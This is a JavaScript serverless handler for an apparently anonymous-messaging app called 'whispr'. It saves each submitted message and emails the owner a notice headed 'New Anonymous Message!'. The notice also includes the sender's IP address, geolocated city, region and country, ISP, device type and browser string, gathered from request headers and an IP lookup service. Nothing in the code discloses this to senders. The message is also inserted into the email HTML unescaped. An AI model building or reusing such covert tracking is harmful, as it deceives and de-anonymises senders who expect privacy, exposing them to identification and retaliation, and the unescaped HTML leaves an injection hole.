const { kv } = require('@vercel/kv');
const nodemailer = require('nodemailer');

// Helper function to get location data from IP if Vercel headers are missing
async function getExtendedMetadata(ip) {
  if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') {
    return { city: 'Local', region: 'Local', country: 'Local', isp: 'Internal' };
  }
  try {
    // We use ip-api.com (free for development) to look up the IP
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await response.json();
    if (data.status === 'success') {
      return {
        city: data.city,
        region: data.regionName,
        country: data.country,
        isp: data.isp
      };
    }
  } catch (e) {
    console.error("Geo Lookup Error:", e);
  }
  return null;
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { username, message } = req.body;
  if (!username || !message) return res.status(400).json({ error: 'Missing data' });

  // 1. IMPROVED IP DETECTION
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
             req.headers['x-real-ip'] || 
             req.socket.remoteAddress || 
             'Unknown';

  // 2. STRONGER LOCATION DETECTION (Vercel Headers + API Fallback)
  let city = req.headers['x-vercel-ip-city'];
  let country = req.headers['x-vercel-ip-country'];
  let region = req.headers['x-vercel-ip-region'];
  let isp = "Vercel Edge";

  // If Vercel headers are missing (localhost or failed detection), use the IP lookup
  if (!city || !country) {
    const extra = await getExtendedMetadata(ip);
    if (extra) {
      city = extra.city;
      country = extra.country;
      region = extra.region;
      isp = extra.isp;
    }
  }

  // 3. BETTER DEVICE DETECTION
  const ua = req.headers['user-agent'] || '';
  const isMobile = /mobile/i.test(ua);
  const isIphone = /iphone/i.test(ua);
  const isAndroid = /android/i.test(ua);
  const deviceType = isIphone ? 'iPhone' : isAndroid ? 'Android' : isMobile ? 'Mobile' : 'Desktop';
  
  const timestamp = new Date().toISOString();
  const readableTime = new Date().toLocaleString('en-PH', { timeZone: 'Asia/Manila' });

  // 4. SAVE TO KV
  try {
    await kv.lpush('messages', { id: Date.now(), username, message, timestamp });
    await kv.ltrim('messages', 0, 99);
  } catch (dbError) {
    console.error("KV Error:", dbError.message);
  }

  // 5. SEND IMPROVED EMAIL
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS }
    });

    await transporter.sendMail({
      from: `"whispr 👁" <${process.env.EMAIL_USER}>`,
      to: process.env.OWNER_EMAIL,
      subject: `💌 New message from @${username}`,
      html: `
        <div style="font-family: sans-serif; max-width: 500px; border: 1px solid #eee; border-radius: 10px; padding: 20px; color: #333;">
          <h2 style="color: #e8176e; margin-top: 0;">New Anonymous Message!</h2>
          <div style="background: #f9f9f9; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; margin-bottom: 20px;">
            "${message}"
          </div>
          
          <table style="width: 100%; font-size: 13px; color: #666;">
            <tr><td><strong>User:</strong></td><td>@${username}</td></tr>
            <tr><td><strong>Device:</strong></td><td>${deviceType}</td></tr>
            <tr><td><strong>Location:</strong></td><td>${city}, ${region}, ${country}</td></tr>
            <tr><td><strong>IP Address:</strong></td><td>${ip}</td></tr>
            <tr><td><strong>Provider:</strong></td><td>${isp}</td></tr>
            <tr><td><strong>Time:</strong></td><td>${readableTime}</td></tr>
          </table>
          
          <p style="font-size: 11px; color: #bbb; margin-top: 20px; text-align: center;">
            Browser Info: ${ua.substring(0, 100)}...
          </p>
        </div>
      `
    });
    console.log(`📧 Email sent for @${username} (Loc: ${city}, ${country})`);
  } catch (emailError) {
    console.error('📧 Email Error:', emailError.message);
  }

  return res.status(200).json({ ok: true });
};